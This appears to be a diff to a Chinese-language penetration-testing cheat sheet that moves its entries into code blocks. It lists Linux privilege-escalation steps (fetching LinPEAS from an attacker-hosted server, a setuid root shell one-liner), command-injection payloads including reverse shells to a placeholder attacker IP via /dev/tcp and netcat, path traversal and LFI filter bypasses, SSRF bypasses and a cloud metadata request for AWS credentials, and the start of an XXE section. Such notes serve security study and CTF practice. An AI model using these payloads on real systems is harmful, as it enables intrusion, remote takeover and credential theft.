@@ -211,15 +211,33 @@ https://ithelp.ithome.com.tw/m/articles/10321942
 4. Linux 提權
 - https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#nopasswd
 - LinPEAS -> https://github.com/carlospolop/PEASS-ng
-(1) wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
-(2) sudo python3 -m http.server 80
-(3) wget http://[attacker ip]:80/linpeas.sh
+(1)
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+```
+(2) 
+```
+sudo python3 -m http.server 80
+```
+(3) 
+```
+wget http://[attacker ip]:80/linpeas.sh
+```
+```
 chmod +x linpeas.sh
+```
+```
 ./linpeas.sh | tee output.txt
-(4) cat output.txt
-(5) python3 -c 'import os; os.os.setuid(0); os.system("/bin/sh")
-https://ithelp.ithome.com.tw/m/articles/10328790
-
+```
+(4) 
+```
+cat output.txt
+```
+(5) 
+```
+python3 -c 'import os; os.os.setuid(0); os.system("/bin/sh")
+```
+- https://ithelp.ithome.com.tw/m/articles/10328790
 - LinEnum -> https://github.com/rebootuser/LinEnum
 - Linux Exploit Suggester -> https://github.com/mzet-/linux-exploit-suggester
 
@@ -236,42 +254,81 @@ https://ithelp.ithome.com.tw/m/articles/10328790
 ```
 - `whoami` 或 $(whoami) (內嵌指令：優先執行括號內的指令)
 (2) 基本探測與讀取敏感檔 (Windows)
-- & type C:\Windows\win.ini
-- | whoami /priv
+```
+& type C:\Windows\win.ini
+```
+```
+| whoami /priv
+```
 (3) 繞過空格過濾 (Linux 常見技巧)
-- ;cat</etc/passwd(利用<` 符號代替空格)
-- ;cat$IFS/etc/passwd (利用 Linux 內建的 $IFS 環境變數代替空格)
+```
+;cat</etc/passwd(利用<` 符號代替空格)
+```
+```
+;cat$IFS/etc/passwd (利用 Linux 內建的 $IFS 環境變數代替空格)
+```
 (4) 建立反向連線 (Reverse Shell，直接控制主機)
-- ; bash -i >& /dev/tcp/攻擊者IP/4444 0>&1
-- ; nc -e /bin/sh 攻擊者IP 4444
-
+```
+; bash -i >& /dev/tcp/攻擊者IP/4444 0>&1
+```
+```
+; nc -e /bin/sh 攻擊者IP 4444
+```
 6. Path Traversal / LFI (路徑穿越 / 本地檔案包含) -> 假設目標網址是 ?file=report.pdf，攻擊者會替換掉 report.pdf。
 (1) 基礎跳脫 (Linux & Windows)
-- ../../../etc/passwd (Linux 密碼檔)
-- ..\..\..\windows\win.ini (Windows 設定檔)
+```
+../../../etc/passwd (Linux 密碼檔)
+```
+```
+..\..\..\windows\win.ini (Windows 設定檔)
+```
 (2) 繞過基礎過濾 (WAF 或簡單的字串替換)
-- ....//....//....//etc/passwd (如果後端只把 ../ 替換成空字串，替換後剛好又變成 ../)
-- %2e%2e%2f%2e%2e%2fetc/passwd (URL 編碼，%2e 是點，%2f 是斜線)
-- %252e%252e%252fetc/passwd (雙重 URL 編碼，用來繞過某些解碼不完全的防火牆)
+```
+....//....//....//etc/passwd (如果後端只把 ../ 替換成空字串，替換後剛好又變成 ../)
+```
+```
+%2e%2e%2f%2e%2e%2fetc/passwd (URL 編碼，%2e 是點，%2f 是斜線)
+```
+```
+%252e%252e%252fetc/passwd (雙重 URL 編碼，用來繞過某些解碼不完全的防火牆)
+```
 (3) 空字節截斷 (針對 PHP 5.3 以下舊版本)
-- ../../../etc/passwd%00.jpg (騙過後端副檔名檢查，但讀取時遇到 %00 就會停止讀取後面的 .jpg)
+```
+../../../etc/passwd%00.jpg (騙過後端副檔名檢查，但讀取時遇到 %00 就會停止讀取後面的 .jpg)
+```
 (4) PHP 封裝協議 (PHP Wrappers，LFI 必考題)
-- php://filter/read=convert.base64-encode/resource=index.php (把網頁的原始碼變成 Base64 印出來，防止 PHP 被直接執行，藉此偷看後端 Source Code)
-
+```
+php://filter/read=convert.base64-encode/resource=index.php (把網頁的原始碼變成 Base64 印出來，防止 PHP 被直接執行，藉此偷看後端 Source Code)
+```
 7. SSRF (伺服器端請求偽造) -> 假設目標網址有抓取圖片功能：?url=http://example.com/image.jpg。
 (1) 探測本地端服務 (Localhost)
-- http://127.0.0.1:80 或 http://localhost:22
+```
+http://127.0.0.1:80 或 http://localhost:22
+```
 (2) 繞過 IP 限制 (如果 WAF 阻擋了 "127.0.0.1")
-- http://0177.0.0.1/ (八進位表示法)
-- http://0x7f000001/ (十六進位表示法)
-- http://2130706433/ (十進位整數表示法)
-- http://localtest.me (這是一個真實存在的網域，但它的 A 紀錄永遠指向 127.0.0.1)
+```
+http://0177.0.0.1/ (八進位表示法)
+```
+```
+http://0x7f000001/ (十六進位表示法)
+```
+```
+http://2130706433/ (十進位整數表示法)
+```
+```
+http://localtest.me (這是一個真實存在的網域，但它的 A 紀錄永遠指向 127.0.0.1)
+```
 (3) 讀取本地檔案 (利用 File 協議)
-- file:///etc/passwd
-- file:///C:/Windows/win.ini
+```
+file:///etc/passwd
+```
+```
+file:///C:/Windows/win.ini
+```
 (4) 攻擊雲端 Metadata (AWS / GCP / Azure)
-- http://169.254.169.254/latest/meta-data/iam/security-credentials/ (直接偷取 AWS 雲端權限 Token)
-
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ (直接偷取 AWS 雲端權限 Token)
+```
 8. XXE (XML 外部實體注入) -> 攻擊者在上傳 XML 檔案，或是 API 接收 XML 格式時，塞入惡意的 <!DOCTYPE>。
 - 經典：讀取本地檔案 -> (將 <name> 的內容替換為密碼檔，並期望前端會把 <name> 的內容印出來)
 ```
